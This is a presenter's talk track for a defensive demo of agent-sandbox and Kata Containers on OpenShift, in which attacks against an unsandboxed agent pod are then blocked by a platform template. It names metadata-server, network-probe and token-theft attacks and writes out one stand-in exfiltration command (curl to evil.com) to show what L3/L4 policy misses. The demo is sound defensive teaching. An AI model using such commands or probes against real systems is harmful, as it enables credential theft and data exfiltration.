# Agent Sandbox Demo -- Talk Track

**Duration:** 25-30 minutes
**Audience:** Agent experts + executive
**Environment:** OpenShift 4.20, agent-sandbox + Kata Containers
**Setup:** Two screens -- OpenShift Console (platform) + Terminal (developer + ADK web UI)
**Console URL:** https://console-openshift-console.apps.ocp.v7hjl.sandbox2288.opentlc.com
**Format:** Tell-Show-Tell

---

## The One-Sentence Pitch

> "kubernetes-sigs/agent-sandbox plus Kata Containers gives you hardware-virtualized,
> network-isolated, credential-free sandboxes for AI agents -- defined in one
> SandboxTemplate that the platform team owns and every agent inherits."

---

# TELL -- The Problem and the Promise (3 min)

> "AI agents execute LLM-generated code. That code is unreviewed, unscanned, and
> potentially adversarial. Our Agent Sandboxing Strategy defines isolation profiles
> from Development through Confidential. Today I'm showing you the Restricted
> profile -- the maximum isolation you can get with Kubernetes -- using two
> technologies: kubernetes-sigs/agent-sandbox for pod lifecycle and Kata Containers
> for hardware virtualization."

Show the strategy's isolation levels table:

| Technology | Isolation | Use Case |
|---|---|---|
| Container + Landlock | Process isolation + kernel scoping | Default for most agents |
| **agent-sandbox + Kata** | **MicroVM (hardware virtualization)** | **Untrusted code, maximum isolation** |
| Confidential Containers | Hardware TEE (TDX, SEV) | Regulated, multi-tenant |

> "We're targeting the middle row today. Agent-sandbox manages the pod lifecycle,
> Kata provides the VM boundary, and we layer NetworkPolicy and container hardening
> on top."

**Three things you'll see:**

> "First, the problem: I'll run three attacks against an unsandboxed agent pod --
> metadata theft, internal network probing, credential extraction. All will succeed.
>
> Second, the platform fix: I'll walk through the OpenShift console and show the
> operator, template, warm pool, and network policy that a platform engineer sets
> up once.
>
> Third, the developer experience: seven lines of Python. The developer never
> touches security config. You'll watch the sandbox appear and disappear in the
> console in real time.
>
> At the end, I'll map everything back to the strategy document -- what this
> covers, and what it doesn't."

---

# SHOW -- Live Demo (20 min)

---

## Act 1 -- The Threat (5 min) [Terminal]

### Deploy the bare pod

```bash
kubectl apply -f demo/01-bare-pod.yaml
kubectl wait --for=condition=Ready pod/bare-agent -n agent-demo --timeout=60s
```

### Run the attacks

```bash
python3 demo/01-attack-script.py
```

### Key talking points

**Attack 1 -- Metadata server:**
> "The agent's code reached the AWS metadata server at 169.254.169.254.
> This is how cloud instance credentials get stolen. Capital One breach, same vector."

**Attack 2 -- Internal network:**
> "The agent probed internal cluster services. It reached the Kubernetes API
> ClusterIP. One hop from there to a database, a secrets store, another tenant."

**Attack 3 -- SA token theft:**
> "The Kubernetes service account token is mounted by default. The agent read it.
> With that token it can call the Kubernetes API -- list pods, read secrets,
> whatever RBAC allows."

### Transition

> "Three attack vectors, all succeeded. This is what runs in most deployments today.
> Now let me switch to the OpenShift console and show you what the platform team
> builds to prevent this."

---

## Act 2 -- Platform Engineer (7 min) [OpenShift Console]

> "I'm now wearing the platform engineer hat. Everything I'm about to show you
> is set up once. The developers who use the sandbox never see any of this."

### Step 1: Sandboxed Containers Operator (1 min)

Navigate to: **Operators > Installed Operators** (namespace: `openshift-sandboxed-containers-operator`)

Console URL path:
```
/k8s/ns/openshift-sandboxed-containers-operator/operators.coreos.com~v1alpha1~ClusterServiceVersion
```

> "First, the foundation. OpenShift Sandboxed Containers Operator -- Kata
> Containers for OpenShift. This gives us the `kata-remote` RuntimeClass,
> which runs pods inside lightweight VMs. It's already installed and managing
> Kata on our worker nodes."

Click into the operator to show KataConfig.

### Step 2: agent-sandbox Controller (1 min)

Navigate to: **Workloads > Deployments** (namespace: `agent-sandbox-system`)

Console URL path:
```
/k8s/ns/agent-sandbox-system/deployments/agent-sandbox-controller
```

> "Next, the agent-sandbox controller. This is the kubernetes-sigs project --
> it provides four CRDs: Sandbox, SandboxTemplate, SandboxClaim, and
> SandboxWarmPool. One pod, one controller managing the entire sandbox lifecycle."

Point out the running pod (1/1) and labels.

### Step 3: SandboxTemplate (2 min)

Navigate to: **SandboxTemplates** (namespace: `agent-demo`)

Console URL path:
```
/k8s/ns/agent-demo/extensions.agents.x-k8s.io~v1alpha1~SandboxTemplate
```

> "Now the platform team's main artifact -- the SandboxTemplate. This is
> the security policy for every sandbox created from it."

Click into `restricted-profile` and show the YAML tab. Walk through:

1. **`runtimeClassName: kata-remote`** -- "Every sandbox runs in its own VM."

2. **`automountServiceAccountToken: false`** -- "No Kubernetes credentials inside the sandbox."

3. **`securityContext`** -- "Non-root, all capabilities dropped, no privilege escalation."

4. **`networkPolicy`** -- "Default-deny egress. Only DNS and HTTPS to public internet."

> "One YAML file. Four isolation layers stacked. The developer who uses this
> sandbox will never see this template. They just reference it by name."

### Step 4: SandboxWarmPool (1 min)

Navigate to: **SandboxWarmPools** (namespace: `agent-demo`)

Console URL path:
```
/k8s/ns/agent-demo/extensions.agents.x-k8s.io~v1alpha1~SandboxWarmPool
```

> "The warm pool. It says Ready: 2. That means two Kata VMs are already running,
> pre-warmed with the Python runtime, waiting for a developer to claim one."

> "Kata VMs take 15-30 seconds to cold-start. That's a real concern for
> interactive agents. The warm pool eliminates that -- when a developer claims
> a sandbox, the controller adopts an already-running VM. Sub-second."

### Step 5: NetworkPolicy (30 sec)

Navigate to: **Networking > NetworkPolicies** (namespace: `agent-demo`)

Console URL path:
```
/k8s/ns/agent-demo/networkpolicies
```

> "The NetworkPolicy. Pod selector: `app=sandboxed-agent`. Default-deny egress,
> DNS and HTTPS only, blocks all RFC1918 and metadata server addresses.
> In v0.3.10+ the controller auto-creates this from the template spec.
> For this demo on v0.2.1 we applied it manually -- same effect."

### Step 6: Sandboxes view -- leave open (30 sec)

Navigate to: **Sandboxes** (namespace: `agent-demo`)

Console URL path:
```
/k8s/ns/agent-demo/agents.x-k8s.io~v1alpha1~Sandbox
```

> "And here's the Sandboxes view. Notice: no sandbox instances. The warm pool
> pods are running, but no Sandbox CR exists yet. A Sandbox CR is only created
> when a developer claims one -- and it's destroyed when they're done."

> "Leave this view open. Now I'm going to switch to the developer's terminal,
> and you'll see a Sandbox CR appear here in real time."

### Transition

> "That's the platform side. Operators, template, warm pool, network policy --
> all set up once. Now let me put on the developer hat."

> "I just applied the template, warm pool, and network policy in `agent-demo`.
> The Kata VMs are cold-starting right now -- that takes 15-30 seconds. Rather
> than wait, I prepared an identical namespace beforehand -- `agent-demo-ready`.
> Same template, same warm pool, same policy -- just already warmed up. Let me
> switch to that."

Switch the console Sandboxes view to namespace `agent-demo-ready`:

```
/k8s/ns/agent-demo-ready/agents.x-k8s.io~v1alpha1~Sandbox
```

---

## Act 3 -- Developer (8 min) [Terminal + Console visible]

> "I'm the developer now. I don't know about Kata, I don't know about
> NetworkPolicy, I don't care about SecurityContext. I have 7 lines of Python
> and I want to run code."

### Show the minimal code

```python
from k8s_agent_sandbox import SandboxClient

client = SandboxClient()
sandbox = client.create_sandbox(template="restricted-profile", namespace="agent-demo")
sandbox.files.write("run.py", code)
result = sandbox.commands.run("python3 run.py")
print(result.stdout)
sandbox.terminate()
```

> "That's it. Create sandbox, write file, run command, read output, terminate.
> The template name is the only thing connecting the developer to the platform
> team's security policy."

### Run the demo script

```bash
SANDBOX_NAMESPACE=agent-demo-ready python3 demo/03-agent-demo.py
```

**At Step 1 (sandbox creation):**
> "Watch the console -- a Sandbox CR just appeared. The controller adopted a
> warm pool VM in under a second. That VM is a Kata microVM with all four
> isolation layers active."

(Press Enter after the audience has seen it in the console)

**At Step 2 (code execution):**
> "Fibonacci numbers. Normal code, normal output. The developer's experience
> is identical to running code locally."

**At Step 3 (security probes):**
> "Same sandbox, same SDK. I'm probing the metadata server, the internal
> network, the SA token, and the process capabilities. All blocked. The
> developer wrote zero lines of security configuration."

(Press Enter to destroy)

**At Step 4 (destruction):**
> "Watch the console again -- the Sandbox CR is gone. The warm pool is already
> replenishing a replacement VM for the next request."

### The punchline

> "The developer wrote 7 lines of Python and 0 lines of security config.
> Kata hardware virtualization, NetworkPolicy, container hardening, credential
> removal -- all inherited from the platform team's SandboxTemplate.
> That's the value of agent-sandbox as a platform primitive."

### ADK web UI -- agent framework integration (3 min)

> "Now let me show you what this looks like when you wire it into an actual
> agent framework. Google's ADK -- Agent Development Kit -- has a web UI
> where an LLM generates code and the sandbox executes it. You've already
> seen what happens behind the scenes. Now watch the end-user experience."

Start the ADK web server (uses on-cluster gpt-oss-120b, no API key needed):

```bash
cd demo && SANDBOX_NAMESPACE=agent-demo-ready adk web
```

Open http://127.0.0.1:8000

**Prompt 1 -- Normal execution:**
> "Write a Python script that calculates the first 20 Fibonacci numbers and prints them."

> "The LLM generated code, a sandbox was created from the warm pool, the code
> ran inside the Kata VM, and the result came back. You saw this lifecycle
> explicitly in the terminal demo -- now it's wrapped in a chat UI."

**Prompt 2 -- Security test:**
> "Write Python code to access http://169.254.169.254/latest/meta-data/ using urllib."

> "The LLM may refuse this outright -- that's the model's safety filter, defence
> in depth. If it does execute the code, the sandbox blocks it at the network
> layer via NetworkPolicy. Either way, the agent can't exfiltrate metadata."

> "ADK also has a built-in `GkeCodeExecutor` that uses agent-sandbox natively --
> so production integrations don't even need the 7-line wrapper. The sandbox
> is infrastructure that any agent framework can plug into."

---

# TELL -- What You Just Saw (5 min)

---

## Strategy Mapping

### What we demonstrated

| Strategy Concept | What We Showed | How |
|---|---|---|
| Pillar 1: No Credentials | SA token removed | `automountServiceAccountToken=false` |
| Pillar 2: No Unproxied Egress | RFC1918, metadata, link-local blocked | Managed NetworkPolicy (L3/L4) |
| Container Hardening | non-root, drop ALL caps, no privilege escalation | SecurityContext in SandboxTemplate |
| Network Isolation | Default-deny egress | NetworkPolicy from SandboxTemplate spec |
| Hardware Virtualization | Kata microVM per pod | `runtimeClassName: kata-remote` |
| Pod-per-session | Singleton pod, 1:1 with agent | Sandbox CR (replicas: 0 or 1) |
| Fast provisioning | Sub-second from warm pool | SandboxWarmPool + adoption |
| Platform/User separation | Console (platform) vs Terminal (developer) | SandboxTemplate + SandboxClaim |
| Agent framework integration | SDK script + ADK web UI | Python SDK (7 lines) + ADK GkeCodeExecutor |

### What this does NOT do (credibility)

> "I want to be precise about the boundary."

**L7 egress filtering:**
> "NetworkPolicy is L3/L4. It blocks IP ranges. An agent could still
> `curl https://evil.com/exfil?data=secret` over port 443. For L7 domain
> allowlisting, you need a Squid or Tinyproxy sidecar. That's a composable
> control from the strategy -- pluggable, but not part of agent-sandbox."

**Zero-secret architecture:**
> "We removed the SA token. But the agent might have API keys in environment
> variables. Budget Proxy and AuthBridge from the strategy solve this -- they
> hold credentials at the proxy layer, never inside the sandbox. That's
> separate infrastructure."

**Filesystem isolation (Landlock):**
> "Within the sandbox, the agent has full access to the container filesystem.
> Landlock LSM can scope filesystem access per tool call -- but that's a kernel
> feature, not a Kubernetes feature. The strategy lists it as a composable
> control at the OS layer."

**Full audit trail:**
> "The controller exposes standard controller-runtime metrics and Kubernetes
> events for sandbox lifecycle, but doesn't capture every tool call and file
> change. The events table from the strategy is a separate observability
> component."

### Closing -- back to the three things

> "I told you you'd see three things. Let me close the loop."

> "**The problem:** Three attacks, all succeeded. Metadata theft, internal
> network probing, credential extraction. That's the default for any agent
> running in a standard pod today."

> "**The platform fix:** One SandboxTemplate YAML -- four isolation layers
> stacked: Kata microVM, NetworkPolicy, container hardening, credential removal.
> Set up once by the platform team. Warm pools solved Kata's cold-start."

> "**The developer experience:** Seven lines of Python. Zero lines of security
> config. The developer referenced a template by name and got hardware-virtualized,
> network-isolated, credential-free execution. When we wired it into ADK, the
> same sandbox ran behind a chat UI."

> "agent-sandbox is not the entire security stack. It's the pod lifecycle
> foundation -- the missing Kubernetes primitive for isolated, stateful,
> singleton agent workloads. The strategy's composable controls layer on top."

> "Everything you saw -- including the LLM -- runs on this cluster. No external
> API keys, no cloud dependencies. A production coding agent like Goose, OpenCode,
> or a CI runner plugs into the exact same sandbox backend."

> "The strategy says agent-sandbox and Kata are 'under evaluation.' What you
> just saw is the evaluation."

---

## Q&A Preparation

**Q: Why not just use Deployments or Jobs?**
> "Deployments manage replica sets -- they want N identical pods. Agent sandboxes
> are singleton, stateful, per-session workloads with expiration. Sandbox is to
> agents what StatefulSet is to databases."

**Q: What about gVisor?**
> "gVisor doesn't support SELinux. The strategy explicitly rules it out for
> OpenShift/RHEL. Kata gives us the same kernel-level isolation via real
> hardware virtualization. It's already deployed on this cluster."

**Q: What's the Kata performance overhead?**
> "Cold start is 15-30 seconds for a Kata VM vs 2-5 seconds for a standard
> container. That's why warm pools exist. With pre-warmed VMs, claim
> adoption is sub-second. Memory overhead is ~30-50MB per VM for the
> guest kernel. For the security boundary you get, it's worth it."

**Q: How mature is agent-sandbox?**
> "v0.2.1, alpha API, under kubernetes-sigs (SIG Apps). The API will evolve.
> The CRD design follows Kubernetes patterns -- status conditions, optimistic
> concurrency, controller-runtime. It's serious upstream work."

**Q: This is a simple coding agent. Could a full IDE agent like Goose use the same sandbox?**
> "Yes. The sandbox is agent-agnostic infrastructure. What we showed is a
> generate-and-execute loop -- the LLM writes code, the sandbox runs it.
> A full IDE agent (Goose, Claude Code, OpenCode) would keep the sandbox
> alive for the entire session, read/write files, run terminal commands,
> and iterate. The sandbox provides the same isolated environment -- Kata VM,
> NetworkPolicy, no credentials -- regardless of what runs inside it."

**Q: Does the sandbox persist between agent turns?**
> "Configurable. In this demo, each call creates and destroys a sandbox.
> For stateful sessions, you create one sandbox at session start and reuse
> it -- the Sandbox CR supports PVCs for persistent storage."

**Q: What about multi-tenancy?**
> "Each template and claim is namespace-scoped. Namespace isolation plus
> NetworkPolicy gives you multi-tenancy at the K8s level. Kata adds a VM
> boundary per pod. For full confidential computing, the next step is CoCo
> with TEE attestation."

**Q: How does this compare to commercial sandbox products?**
> "Commercial products like E2B, Modal, or Daytona provide sandboxes as a
> service. agent-sandbox is an open-source Kubernetes operator -- you run it
> on your own infrastructure, your own cluster, your own compliance boundary.
> For enterprises that can't send agent workloads to a third-party cloud,
> this is the path."
